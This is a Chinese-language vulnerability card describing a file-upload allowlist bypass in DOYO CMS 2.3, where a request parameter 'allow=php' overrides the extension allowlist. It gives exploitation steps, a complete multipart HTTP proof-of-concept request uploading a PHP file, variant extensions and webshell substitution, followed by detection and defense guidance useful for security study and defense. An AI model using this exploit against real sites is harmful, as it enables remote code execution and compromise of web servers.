---
id: web-generic-file-upload-upload-allow-param-whitelist-bypass
title: 上传接口把 allow 参数当扩展名白名单：请求传 allow=php 直接上传 PHP WebShell
type: scenario
domain: web
path: web/generic/file-upload
technique: request-controlled-extension-allowlist
aliases:
- allow=php 上传
- 上传白名单参数可控
- DOYO CMS 文件上传
- KindEditor 上传 RCE
- syupload allow_types 绕过
tags:
- php
- file-upload
- allowlist-bypass
- request-parameter
- webshell
- cms
- kindeditor
cve: []
severity: critical
confidence: high
status: verified
affected_versions: DOYO CMS 2.3（原文 config version=2.3、update=20130118）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V31
  verified_at: '2026-11-05T06:03:00+08:00'
  notes: '已对照原文与图20-23核对：admin/uploads.php 中 $allow = $this->syArgs(''allow'',1)!='''' ? $this->syArgs(''allow'',1) : syExt(''filetype'')，请求参数优先于配置白名单；图22 POST admin.php?c=uploads&...&allow=php 上传 1.php 返回 {"error":0,"url":"uploads/2025/05/281507034434.php"}，落盘位于 Web 根 uploads/年/月/ 且保留 .php 扩展名；原文未截图访问执行该文件（属明显未验证点），但 PHP 站点默认解析该目录，整链成立。版本 DOYO CMS 2.3 原文 config 标注。PoC 未在本机复现。'
---

## 一句话结论

CMS 的上传控制器 `uploads` 从请求参数 `allow` 读取“允许上传类型”，只有该参数为空时才回退到配置文件白名单；攻击者（登录后台后）传 `allow=php` 就等价于把白名单改成 PHP，随后上传 `1.php`，文件落到 Web 可访问的 `uploads/年/月/` 目录并可直接执行。

## 原理

- `admin/uploads.php` 的 `uploads::index()`：
  ```php
  $allow = $this->syArgs('allow',1) != '' ? $this->syArgs('allow',1) : syExt('filetype');
  ```
  即请求参数优先于站点配置；`$allow` 作为 `allow_types` 传给 `syupload` 构造函数。
- `syupload` 用 `allow_types` 做扩展名检查；原本 `filetype` 配置是 `jpg,gif,jpeg,bmp,png,...`，不包含 `php`，但攻击者传入 `allow=php` 后，白名单被替换为 `php`，`1.php` 通过检查。
- 上传类的保存路径为 `uploads/年/月/`，文件名按日期/随机数生成但保留原始扩展名；该目录位于 Web 根下，Apache/PHP 会解析 `.php`。
- 控制器通过 `isfiles=editor_KindEditor` 选择 KindEditor 分支，返回 JSON `{"error":0,"url":"uploads/2025/05/281507034434.php"}`，直接给出可访问路径。
- 根因是“安全策略参数来自客户端”：白名单、大小、水印、缩放等配置都可由请求覆盖，服务端没有把 `allow` 固定为配置值或做允许集合校验。
- 该接口位于 `/admin.php`，正常需要后台会话；常与弱口令、后台越权、默认口令组合，形成登录后台即 RCE。

## 触发条件

- 目标为 DOYO CMS（或复用相同 `uploads`/`syupload` 代码的衍生系统）。
- 攻击者拥有后台管理员会话。
- `uploads` 目录位于 Web 根下且允许 PHP 解析；上传类可写。
- 请求能传入 `allow`、`isfiles` 等参数；KindEditor 上传入口开放。

## 利用步骤

1. 登录后台，打开文章编辑器的图片/文件上传，抓取 `admin.php?c=uploads&...` 请求。
2. 在 query 中加入 `allow=php`（可保留 `isfiles=editor_KindEditor&dir=image&tid=`）。
3. 以 multipart 上传 `1.php`，内容为 `<?php phpinfo();?>` 或一句话；`Content-Type` 可伪装为 `image/png`。
4. 从响应 `url` 字段取得落盘路径（如 `uploads/2025/05/281507034434.php`）。
5. 访问 `http://target/uploads/2025/05/281507034434.php`，确认 PHP 执行。
6. 替换为实际 Webshell/命令执行代码，评估权限；授权测试中及时清理。

## PoC

```http
POST /admin.php?c=uploads&tid=&isfiles=editor_KindEditor&dir=image&allow=php HTTP/1.1
Host: target
Cookie: PHPSESSID=<admin-session>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPsAo4Q9ZzQyplVq7

------WebKitFormBoundaryPsAo4Q9ZzQyplVq7
Content-Disposition: form-data; name="localUrl"

111.png
------WebKitFormBoundaryPsAo4Q9ZzQyplVq7
Content-Disposition: form-data; name="editor_KindEditor"; filename="1.php"
Content-Type: image/png

<?php phpinfo();?>
------WebKitFormBoundaryPsAo4Q9ZzQyplVq7--
```

响应：

```json
{"error":0,"url":"uploads/2025/05/281507034434.php"}
```

## 变体与关联

- 扩展名变体：`allow=php,phtml,php5`；其它栈可尝试 `jsp/jspx/asp/aspx`，取决于目标中间件。
- 参数变体：`size`、`water`、`caling`、`w`、`h` 同样来自请求，可绕过大小/图片处理限制；`dir`/`isfiles` 控制保存分支。
- 路径变体：上传文件名保留原始扩展名，落盘为 `uploads/YYYY/MM/<时间戳+随机>.php`；若目录可列或响应回显 url，可直接定位。
- 关联卡片：[[web-generic-file-upload-client-side-whitelist-bypass]]（前端白名单绕过）、[[web-generic-file-upload-weak-suffix-bypass]]、[[web-generic-file-upload-extension-zero-check]]。
- 关联：后台弱口令/越权是前置条件；上传目录禁止脚本解析是通用缓解。

## 检测与防御

- 检测：`admin.php?c=uploads` 请求的 `allow` 参数非空且包含 `php/jsp/asp` 等可执行后缀；`isfiles=editor_KindEditor` 上传的文件名为脚本后缀。
- 检测：`uploads/年/月/` 下出现 `.php` 文件；上传响应返回 `.php` 的 url；Web 访问该路径返回 PHP 输出。
- 防御：`allow` 等安全参数不得来自请求；服务端固定使用配置白名单，并对传入值做白名单校验/忽略。
- 防御：上传目录移出 Web 根或禁止脚本解析；文件名强制安全扩展名（如按 MIME 生成）；检查文件内容/magic bytes。
- 加固：后台强口令/MFA、上传功能权限最小化、上传审计与告警；WAF 辅助拦截脚本后缀上传。
- 响应：删除恶意脚本、排查同时间段上传与访问日志、轮换后台凭据、检查是否有其它 Webshell。
